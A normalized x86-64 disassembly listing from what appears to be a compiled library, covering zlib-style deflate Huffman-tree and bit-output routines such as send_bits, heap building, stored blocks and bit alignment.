mov [ r9 + 0x1714 ] eax
or [ r9 + 0x1710 ] r10w
jmp r-xdata
mov edx [ r9 + 0x28 ]
lea r8d [ r10 - 0x3 ]
movzx eax r8w
shl ax cl
mov rcx [ r9 + 0x10 ]
or [ r9 + 0x1710 ] ax
movzx eax [ r9 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov edx [ r9 + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ r9 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r9 + 0x1714 ]
add [ r9 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xe ]
sub cl dl
mov [ r9 + 0x1714 ] eax
shr r8w cl
mov [ r9 + 0x1710 ] r8w
jmp r-xdata
mov ecx [ r9 + 0x1714 ]
cmp ecx 0xe
jle r-xdata
sub r10d 0x1
cmp edi esi
jne r-xdata
mov eax 0x8a
lea ecx [ rsi + 0x3 ]
jmp r-xdata
mov eax 0x7
lea ecx [ rax - 0x3 ]
mov eax 0x6
lea ecx [ rax - 0x3 ]
jmp r-xdata
sub_10014400
sub rsp 0x28
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rsi
mov rbx rcx
mov ecx [ rcx + 0x1714 ]
mov [ rsp + 0x48 ] rdi
mov r11d r9d
cmp ecx 0xb
mov edi r8d
mov esi edx
jle r-xdata
lea eax [ rdx - 0x101 ]
shl ax cl
or [ rbx + 0x1710 ] ax
lea eax [ rcx + 0x5 ]
mov [ rbx + 0x1714 ] eax
lea r10d [ rdx - 0x101 ]
mov edx [ rbx + 0x28 ]
movzx eax r10w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1710 ] ax
movzx eax [ rbx + 0x1710 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rbx + 0x1711 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x1714 ]
add [ rbx + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xb ]
sub cl dl
mov [ rbx + 0x1714 ] eax
shr r10w cl
mov [ rbx + 0x1710 ] r10w
jmp r-xdata
lea eax [ r8 - 0x1 ]
shl ax cl
or [ rbx + 0x1710 ] ax
lea eax [ rcx + 0x5 ]
mov [ rbx + 0x1714 ] eax
mov edx [ rbx + 0x28 ]
add r8d 0xffffffff
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1710 ] ax
movzx eax [ rbx + 0x1710 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rbx + 0x1711 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x1714 ]
add [ rbx + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xb ]
sub cl dl
mov [ rbx + 0x1714 ] eax
shr r8w cl
mov [ rbx + 0x1710 ] r8w
jmp r-xdata
mov ecx [ rbx + 0x1714 ]
cmp ecx 0xb
jle r-xdata
lea eax [ r11 - 0x4 ]
shl ax cl
or [ rbx + 0x1710 ] ax
lea eax [ rcx + 0x4 ]
mov [ rbx + 0x1714 ] eax
mov edx [ rbx + 0x28 ]
lea r8d [ r11 - 0x4 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1710 ] ax
movzx eax [ rbx + 0x1710 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rbx + 0x1711 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x1714 ]
add [ rbx + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xc ]
sub cl dl
mov [ rbx + 0x1714 ] eax
shr r8w cl
mov [ rbx + 0x1710 ] r8w
jmp r-xdata
mov ecx [ rbx + 0x1714 ]
cmp ecx 0xc
jle r-xdata
lea r8d [ rsi - 0x1 ]
lea rdx [ rbx + 0xbc ]
mov rcx rbx
call sub_10013dd0
lea r8d [ rdi - 0x1 ]
lea rdx [ rbx + 0x9b0 ]
mov rcx rbx
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
jmp sub_10013dd0
lea r9 [ r--data ]
mov r10 r11
nop
test r11d r11d
jle r-xdata
movzx eax [ r9 ]
movzx edx [ rbx + rax * 4 + 0xaa6 ]
lea eax [ rcx + 0x3 ]
shl dx cl
mov [ rbx + 0x1714 ] eax
or [ rbx + 0x1710 ] dx
movzx eax [ r9 ]
mov edx [ rbx + 0x28 ]
movzx r8d [ rbx + rax * 4 + 0xaa6 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1710 ] ax
movzx eax [ rbx + 0x1710 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
mov edx [ rbx + 0x28 ]
movzx eax [ rbx + 0x1711 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x1714 ]
add [ rbx + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
mov [ rbx + 0x1714 ] eax
shr r8w cl
mov [ rbx + 0x1710 ] r8w
jmp r-xdata
mov ecx [ rbx + 0x1714 ]
cmp ecx 0xd
jle r-xdata
add r9 0x1
sub r10 0x1
jne r-xdata
sub_100146a0
mov rax rsp
sub rsp 0x28
mov [ rax + 0x8 ] rbx
mov [ rax + 0x20 ] rdi
mov [ rax - 0x8 ] r12
xor r12d r12d
mov [ rax - 0x18 ] r14
mov rdi rdx
cmp [ rcx + 0x16f4 ] r12d
lea ebx [ r12 + 0x10 ]
mov r14 r8
mov r10 rcx
je r-xdata
movzx r11d [ rdi + 0x402 ]
mov ecx [ r10 + 0x1714 ]
mov r14 [ rsp + 0x10 ]
mov r12 [ rsp + 0x20 ]
mov eax ebx
sub eax r11d
cmp ecx eax
jle r-xdata
mov [ rax - 0x10 ] r13
mov [ rax - 0x20 ] r15
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov r13 r12
lea r15 [ __dos_header ]
nop
movzx eax [ rdi + 0x400 ]
shl ax cl
or [ r10 + 0x1710 ] ax
lea eax [ rcx + r11 ]
movzx r9d [ rdi + 0x400 ]
mov r8d [ r10 + 0x28 ]
mov rdx [ r10 + 0x10 ]
movzx eax r9w
shl ax cl
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ r8 + rdx ] al
add [ r10 + 0x28 ] 0x1
movzx eax [ r10 + 0x1711 ]
mov r8d [ r10 + 0x28 ]
mov rdx [ r10 + 0x10 ]
mov [ r8 + rdx ] al
mov eax [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
sub bl al
lea eax [ rax + r11 - 0x10 ]
movzx ecx bl
shr r9w cl
mov [ r10 + 0x1710 ] r9w
jmp r-xdata
movzx ebp [ r11 + r15 + 0x17900 ]
mov ecx [ r10 + 0x1714 ]
lea eax [ rbp + 0x101 ]
mov edx eax
movzx esi [ rdi + rax * 4 + 0x2 ]
mov eax ebx
sub eax esi
cmp ecx eax
jle r-xdata
mov ecx [ r10 + 0x1714 ]
movsxd rdx r11d
mov eax ebx
movzx r9d [ rdi + rdx * 4 + 0x2 ]
sub eax r9d
cmp ecx eax
jle r-xdata
mov rbx [ rsp + 0x30 ]
mov [ r10 + 0x1714 ] eax
movzx eax [ rdi + 0x402 ]
mov rdi [ rsp + 0x48 ]
mov [ r10 + 0x170c ] eax
add rsp 0x28
retn
movzx eax [ rdi + rdx * 4 ]
shl ax cl
or [ r10 + 0x1710 ] ax
lea eax [ rcx + rsi ]
mov [ r10 + 0x1714 ] eax
movzx r8d [ rdi + rdx * 4 ]
mov edx [ r10 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx ebx
lea eax [ rdx + rsi - 0x10 ]
sub cl dl
mov [ r10 + 0x1714 ] eax
shr r8w cl
mov [ r10 + 0x1710 ] r8w
jmp r-xdata
movzx eax [ rdi + rdx * 4 ]
shl ax cl
or [ r10 + 0x1710 ] ax
lea eax [ rcx + r9 ]
mov [ r10 + 0x1714 ] eax
jmp r-xdata
movzx r8d [ rdi + rdx * 4 ]
mov edx [ r10 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx ebx
lea eax [ rdx + r9 - 0x10 ]
sub cl dl
mov [ r10 + 0x1714 ] eax
shr r8w cl
mov [ r10 + 0x1710 ] r8w
jmp r-xdata
add r9d 0xffffffff
cmp r9d 0x100
jae r-xdata
mov ecx [ r10 + 0x1714 ]
sub r11d [ r15 + rbp * 4 + 0x17a00 ]
mov eax ebx
sub eax r8d
cmp ecx eax
jle r-xdata
mov r8d [ r15 + rbp * 4 + 0x17090 ]
test r8d r8d
je r-xdata
cmp r12d [ r10 + 0x16f4 ]
jb r-xdata
mov eax r9d
shr eax 0x7
add eax 0x100
movzx ecx [ rax + r15 + 0x17700 ]
movzx ecx [ r9 + r15 + 0x17700 ]
jmp r-xdata
lea eax [ rcx + r8 ]
shl r11w cl
or [ r10 + 0x1710 ] r11w
mov [ r10 + 0x1714 ] eax
mov edx [ r10 + 0x28 ]
movzx eax r11w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx ebx
lea eax [ rdx + r8 - 0x10 ]
sub cl dl
mov [ r10 + 0x1714 ] eax
shr r11w cl
mov [ r10 + 0x1710 ] r11w
jmp r-xdata
mov rax [ r10 + 0x16f8 ]
mov ecx r12d
add r13 0x2
movzx r9d [ rax + r13 - 0x2 ]
mov rax [ r10 + 0x16e8 ]
add r12d 0x1
test r9d r9d
movzx r11d [ rcx + rax ]
jne r-xdata
mov r15 [ rsp + 0x8 ]
mov r13 [ rsp + 0x18 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
movzx eax [ r14 + r11 * 4 ]
shl ax cl
or [ r10 + 0x1710 ] ax
lea eax [ rcx + rsi ]
mov [ r10 + 0x1714 ] eax
movzx r8d [ r14 + r11 * 4 ]
mov edx [ r10 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx ebx
lea eax [ rdx + rsi - 0x10 ]
sub cl dl
mov [ r10 + 0x1714 ] eax
shr r8w cl
mov [ r10 + 0x1710 ] r8w
jmp r-xdata
movzx esi [ r14 + rcx * 4 + 0x2 ]
mov r11d ecx
mov ecx [ r10 + 0x1714 ]
mov eax ebx
sub eax esi
cmp ecx eax
jle r-xdata
mov ecx [ r10 + 0x1714 ]
sub r9d [ r15 + r11 * 4 + 0x17a80 ]
mov eax ebx
sub eax r8d
cmp ecx eax
jle r-xdata
mov r8d [ r15 + r11 * 4 + 0x17110 ]
test r8d r8d
je r-xdata
lea eax [ rcx + r8 ]
shl r9w cl
or [ r10 + 0x1710 ] r9w
mov [ r10 + 0x1714 ] eax
mov edx [ r10 + 0x28 ]
movzx eax r9w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx ebx
lea eax [ rdx + r8 - 0x10 ]
sub cl dl
mov [ r10 + 0x1714 ] eax
shr r9w cl
mov [ r10 + 0x1710 ] r9w
jmp r-xdata
sub_10014b60
xor r9d r9d
mov r10 rcx
lea rdx [ rcx + 0xbc ]
mov eax r9d
mov r8 r9
cmp eax 0x9
jne r-xdata
add r8 0x1
add eax 0x1
add rdx 0x4
cmp r8 0x9
jl r-xdata
cmp eax 0x20
mov rax [ r10 ]
sete r9b
mov [ rax + 0x48 ] r9d
retn
mov eax 0xe
add rcx 0xf4
mov rdx rax
nop
cmp [ rdx ] r9w
jne r-xdata
add rdx 0x1
add eax 0x1
add rcx 0x4
cmp rdx 0x20
jl r-xdata
cmp [ rcx ] r9w
jne r-xdata
sub_10014bd0
xor eax eax
nop
nop
nop
nop
mov r8d ecx
sub edx 0x1
shr ecx 0x1
and r8d 0x1
or eax r8d
add eax eax
test edx edx
jg r-xdata
shr eax 0x1
retn
sub_10014c00
mov eax [ rcx + 0x1714 ]
mov r9 rcx
cmp eax 0x10
jne r-xdata
cmp eax 0x8
jl r-xdata
mov r8d [ rcx + 0x28 ]
movzx eax [ rcx + 0x1710 ]
mov rdx [ rcx + 0x10 ]
mov [ r8 + rdx ] al
add [ rcx + 0x28 ] 0x1
mov edx [ rcx + 0x28 ]
movzx eax [ r9 + 0x1711 ]
mov rcx [ rcx + 0x10 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov [ r9 + 0x1710 ] 0x0
mov [ r9 + 0x1714 ] 0x0
retn
retn 0x0
mov edx [ rcx + 0x28 ]
movzx eax [ r9 + 0x1710 ]
mov rcx [ rcx + 0x10 ]
mov [ rdx + rcx ] al
movzx eax [ r9 + 0x1711 ]
add [ r9 + 0x28 ] 0x1
add [ r9 + 0x1714 ] 0xfffffff8
mov [ r9 + 0x1710 ] ax
sub_10014c90
mov eax [ rcx + 0x1714 ]
mov r9 rcx
cmp eax 0x8
jle r-xdata
test eax eax
jle r-xdata
mov r8d [ rcx + 0x28 ]
movzx eax [ rcx + 0x1710 ]
mov rdx [ rcx + 0x10 ]
mov [ r8 + rdx ] al
add [ rcx + 0x28 ] 0x1
movzx eax [ rcx + 0x1711 ]
mov [ rcx + 0x1710 ] 0x0
mov [ rcx + 0x1714 ] 0x0
retn
movzx eax [ r9 + 0x1710 ]
jmp r-xdata
mov edx [ rcx + 0x28 ]
mov rcx [ rcx + 0x10 ]
mov [ rdx + rcx ] al
add [ r9 + 0x28 ] 0x1
mov [ r9 + 0x1710 ] 0x0
mov [ r9 + 0x1714 ] 0x0
retn
sub_10014d10
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rdi
mov r10d r9d
mov rdi rdx
mov ebx r8d
mov r11 rcx
call sub_10014c90
test r10d r10d
mov [ r11 + 0x170c ] 0x8
je r-xdata
test ebx ebx
je r-xdata
mov r9d [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
movzx ecx bx
mov [ r9 + rax ] bl
add [ r11 + 0x28 ] 0x1
mov edx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
shr cx 0x8
mov [ rdx + rax ] cl
add [ r11 + 0x28 ] 0x1
mov edx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
movzx ecx bl
not cl
mov [ rdx + rax ] cl
add [ r11 + 0x28 ] 0x1
mov edx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
movzx ecx bx
not cx
shr cx 0x8
mov [ rdx + rax ] cl
add [ r11 + 0x28 ] 0x1
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
nop
nop
movzx eax [ rdi ]
mov edx [ r11 + 0x28 ]
mov rcx [ r11 + 0x10 ]
mov [ rdx + rcx ] al
add [ r11 + 0x28 ] 0x1
add rdi 0x1
add ebx 0xffffffff
jne r-xdata
sub_10014dd0
lea rax [ rcx + 0xbc ]
mov [ rcx + 0x1710 ] 0x0
mov [ rcx + 0x1714 ] 0x0
mov [ rcx + 0xb40 ] rax
lea rax [ rw-data ]
mov [ rcx + 0x170c ] 0x8
mov [ rcx + 0xb50 ] rax
lea rax [ rcx + 0x9b0 ]
mov [ rcx + 0xb58 ] rax
lea rax [ rw-data ]
mov [ rcx + 0xb68 ] rax
lea rax [ rcx + 0xaa4 ]
mov [ rcx + 0xb70 ] rax
lea rax [ rw-data ]
mov [ rcx + 0xb80 ] rax
jmp sub_10013900
sub_10014e50
sub rsp 0x58
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x22 ]
xor r10w r10w
mov r11 rcx
sub r8 rax
mov r9d 0x1
nop
nop
lea rax [ r8 + r9 * 2 ]
add r9 0x1
add r10w [ rsp + rax + 0x20 ]
add r10w r10w
cmp r9 0xf
mov [ rsp + r9 * 2 + 0x1e ] r10w
jle r-xdata
xor r9d r9d
test edx edx
movsxd r10 edx
js r-xdata
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_10010a60
add rsp 0x58
retn
nop
nop
add r9 0x1
cmp r9 r10
jle r-xdata
movzx ecx [ rsp + rdx * 2 + 0x20 ]
lea eax [ rcx + 0x1 ]
mov [ rsp + rdx * 2 + 0x20 ] ax
call sub_10014bd0
mov [ r11 + r9 * 4 ] ax
movzx edx [ r11 + r9 * 4 + 0x2 ]
test edx edx
je r-xdata
sub_10014ef0
sub rsp 0x38
mov rax [ rdx + 0x10 ]
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
mov rsi [ rdx ]
mov r9 [ rax ]
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x30 ] r12
movsxd r12 [ rax + 0x14 ]
mov rdi rcx
mov [ rcx + 0x149c ] 0x0
mov [ rcx + 0x14a0 ] 0x23d
xor r8d r8d
xor ecx ecx
test r12d r12d
mov [ rsp + 0x28 ] r13
mov r13 rdx
mov ebp 0xffffffff
jle r-xdata
cmp [ rdi + 0x149c ] 0x2
jge r-xdata
cmp [ rsi + rcx * 4 ] 0x0
je r-xdata
mov [ rdx + 0x8 ] ebp
mov eax [ rdi + 0x149c ]
mov [ rsp + 0x40 ] rbx
cdq
sub eax edx
sar eax 0x1
cmp eax 0x1
mov ebx eax
jl r-xdata
nop
nop
mov [ rsi + rcx * 4 + 0x2 ] 0x0
add [ rdi + 0x149c ] 0x1
movsxd rax [ rdi + 0x149c ]
mov ebp r8d
mov [ rdi + rax * 4 + 0xba8 ] r8d
mov [ rcx + rdi + 0x14a4 ] 0x0
jmp r-xdata
movsxd rdx [ rdi + 0x149c ]
movsxd rbx [ rdi + 0xbac ]
mov r8d 0x1
mov ecx [ rdi + rdx * 4 + 0xba8 ]
lea eax [ rdx - 0x1 ]
mov rdx rsi
mov [ rdi + 0xbac ] ecx
mov rcx rdi
mov [ rdi + 0x149c ] eax
call sub_10013990
add [ rdi + 0x14a0 ] 0xffffffff
movsxd rcx [ rdi + 0xbac ]
movsxd rax [ rdi + 0x14a0 ]
movsxd r9 r12d
mov rdx rcx
mov [ rdi + rax * 4 + 0xba8 ] ebx
add [ rdi + 0x14a0 ] 0xffffffff
movsxd rax [ rdi + 0x14a0 ]
mov [ rdi + rax * 4 + 0xba8 ] ecx
movzx eax [ rsi + rbx * 4 ]
add ax [ rsi + rcx * 4 ]
mov [ rsi + r9 * 4 ] ax
movzx eax [ rbx + rdi + 0x14a4 ]
movzx ecx [ rcx + rdi + 0x14a4 ]
cmp al cl
jb r-xdata
nop
xor ecx ecx
add ebp 0x1
mov ecx ebp
jmp r-xdata
add rcx 0x1
add r8d 0x1
cmp rcx r12
jl r-xdata
movzx eax cl
movzx eax al
jmp r-xdata
mov r8d ebx
mov rdx rsi
mov rcx rdi
call sub_10013990
sub ebx 0x1
cmp ebx 0x1
jge r-xdata
nop
nop
nop
cmp [ rdi + 0x149c ] 0x2
jl r-xdata
movzx eax [ r9 + rax * 4 + 0x2 ]
sub [ rdi + 0x1704 ] eax
add [ rdi + 0x149c ] 0x1
movsxd rax [ rdi + 0x149c ]
mov [ rdi + rax * 4 + 0xba8 ] ecx
movsxd rax ecx
mov [ rsi + rax * 4 ] 0x1
mov [ rax + rdi + 0x14a4 ] 0x0
add [ rdi + 0x1700 ] 0xffffffff
test r9 r9
je r-xdata
add [ rdi + 0x14a0 ] 0xffffffff
movsxd r8 [ rdi + 0x14a0 ]
mov eax [ rdi + 0xbac ]
mov rdx r13
mov [ rdi + r8 * 4 + 0xba8 ] eax
call sub_10013a90
lea r8 [ rdi + 0xb88 ]
mov edx ebp
mov rcx rsi
mov r13 [ rsp + 0x28 ]
mov r12 [ rsp + 0x30 ]
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x38
jmp sub_10014e50
add al 0x1
mov r8d 0x1
mov rcx rdi
mov [ r9 + rdi + 0x14a4 ] al
mov [ rsi + rdx * 4 + 0x2 ] r12w
mov [ rsi + rbx * 4 + 0x2 ] r12w
mov [ rdi + 0xbac ] r12d
mov rdx rsi
add r12d 0x1
call sub_10013990
cmp [ rdi + 0x149c ] 0x2
jge r-xdata
cmp ebp 0x2
jge r-xdata
sub_10015150
push rbx
sub rsp 0x20
mov r8d [ rcx + 0xb48 ]
lea rdx [ rcx + 0xbc ]
mov rbx rcx
call sub_10013ce0
mov r8d [ rcx + 0xb60 ]
lea rdx [ rcx + 0x9b0 ]
call sub_10013ce0
lea rdx [ rcx + 0xb70 ]
call sub_10014ef0
mov r11d 0x12
lea rax [ r--data ]
mov rdx r11
nop
nop
lea ecx [ r11 + r11 * 2 + 0x11 ]
mov eax r11d
add [ rbx + 0x1700 ] ecx
add rsp 0x20
pop rbx
retn
sub rdx 0x1
sub r11d 0x1
cmp rdx 0x3
jge r-xdata
movzx ecx [ rdx + rax ]
cmp [ rbx + rcx * 4 + 0xaa6 ] 0x0
jne r-xdata
sub_100151e0
mov r10 rcx
mov ecx [ rcx + 0x1714 ]
mov r11 rdx
cmp ecx 0xd
jle r-xdata
shl r9w cl
lea eax [ rcx + 0x3 ]
or [ r10 + 0x1710 ] r9w
mov edx [ r10 + 0x28 ]
movzx eax r9w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
shr r9w cl
mov [ r10 + 0x1710 ] r9w
jmp r-xdata
mov r9d 0x1
mov rdx r11
mov rcx r10
mov [ r10 + 0x1714 ] eax
jmp sub_10014d10
sub_10015280
sub rsp 0x28
mov r10 rcx
mov ecx [ rcx + 0x1714 ]
mov [ rsp + 0x40 ] rbx
cmp ecx 0xd
mov [ rsp + 0x48 ] rdi
mov edi 0x10
jle r-xdata
mov ebx 0x2
mov eax ebx
shl ax cl
or [ r10 + 0x1710 ] ax
lea eax [ rcx + 0x3 ]
mov [ r10 + 0x1714 ] eax
mov edx [ r10 + 0x28 ]
mov ebx 0x2
mov eax ebx
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov r8d [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx edi
mov edx ebx
lea eax [ r8 - 0xd ]
sub cl r8b
mov [ r10 + 0x1714 ] eax
shr dx cl
mov [ r10 + 0x1710 ] dx
jmp r-xdata
xor r11d r11d
mov eax r11d
shl ax cl
or [ r10 + 0x1710 ] ax
lea eax [ rcx + 0x7 ]
mov [ r10 + 0x1714 ] eax
mov edx [ r10 + 0x28 ]
xor r11d r11d
mov eax r11d
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov r8d [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx edi
mov edx r11d
lea eax [ r8 - 0x9 ]
sub cl r8b
mov [ r10 + 0x1714 ] eax
shr dx cl
mov [ r10 + 0x1710 ] dx
jmp r-xdata
mov ecx [ r10 + 0x1714 ]
cmp ecx 0x9
jle r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov [ r10 + 0x170c ] 0x7
add rsp 0x28
retn
cmp ecx 0xd
jle r-xdata
mov rcx r10
call sub_10014c00
mov ecx [ r10 + 0x1714 ]
mov eax [ r10 + 0x170c ]
sub eax ecx
add eax 0xb
cmp eax 0x9
jge r-xdata
lea eax [ rcx + 0x3 ]
shl bx cl
or [ r10 + 0x1710 ] bx
mov [ r10 + 0x1714 ] eax
mov edx [ r10 + 0x28 ]
mov eax ebx
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ rdx + rcx ] al
add [ r10 + 0x28 ] 0x1
mov edx [ r10 + 0x28 ]
movzx eax [ r10 + 0x1711 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
mov ecx edi
lea eax [ rdx - 0xd ]
sub cl dl
mov [ r10 + 0x1714 ] eax
shr bx cl
mov [ r10 + 0x1710 ] bx
jmp r-xdata
shl r11w cl
lea eax [ rcx + 0x7 ]
or [ r10 + 0x1710 ] r11w
mov r8d [ r10 + 0x28 ]
mov rdx [ r10 + 0x10 ]
mov eax r11d
shl ax cl
or [ r10 + 0x1710 ] ax
movzx eax [ r10 + 0x1710 ]
mov [ r8 + rdx ] al
add [ r10 + 0x28 ] 0x1
movzx eax [ r10 + 0x1711 ]
mov r8d [ r10 + 0x28 ]
mov rdx [ r10 + 0x10 ]
mov [ r8 + rdx ] al
mov eax [ r10 + 0x1714 ]
add [ r10 + 0x28 ] 0x1
sub dil al
movzx ecx dil
shr r11w cl
add eax 0xfffffff7
mov [ r10 + 0x1710 ] r11w
jmp r-xdata
mov ecx [ r10 + 0x1714 ]
cmp ecx 0x9
jle r-xdata
mov rcx r10
mov [ r10 + 0x1714 ] eax
call sub_10014c00
sub_10015500
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
mov esi r9d
xor r9d r9d
mov [ rsp + 0x48 ] rdi
cmp [ rcx + 0xac ] r9d
mov rbp rdx
mov rbx rcx
mov edi r8d
jle r-xdata
lea edx [ r8 + 0x5 ]
mov ecx edx
test r8d r8d
je r-xdata
cmp [ rbx + 0xb0 ] 0x4
je r-xdata
test rbp rbp
je r-xdata
lea rdx [ rbx + 0xb40 ]
mov rcx rbx
call sub_10014ef0
lea rdx [ rbx + 0xb58 ]
mov rcx rbx
call sub_10014ef0
mov rcx rbx
call sub_10015150
mov ecx [ rbx + 0x1700 ]
mov edx [ rbx + 0x1704 ]
add ecx 0xa
add edx 0xa
mov r9d eax
shr ecx 0x3
shr edx 0x3
cmp edx ecx
ja r-xdata
mov rax [ rcx ]
cmp [ rax + 0x48 ] 0x2
jne r-xdata
mov ecx [ rbx + 0x1714 ]
cmp ecx 0xd
jle r-xdata
cmp edx ecx
je r-xdata
mov r9d esi
mov r8d edi
mov rdx rbp
mov rcx rbx
call sub_100151e0
jmp r-xdata
lea eax [ rdi + 0x4 ]
cmp eax ecx
ja r-xdata
mov ecx edx
jmp r-xdata
call sub_10014b60
lea eax [ rsi + 0x2 ]
shl ax cl
or [ rbx + 0x1710 ] ax
lea eax [ rcx + 0x3 ]
mov [ rbx + 0x1714 ] eax
mov edx [ rbx + 0x28 ]
lea r8d [ rsi + 0x2 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1710 ] ax
movzx eax [ rbx + 0x1710 ]
mov [ rdx + rcx ] al
add [ rbx + 0x28 ] 0x1
movzx eax [ rbx + 0x1711 ]
mov edx [ rbx + 0x28 ]
mov rcx [ rbx + 0x10 ]
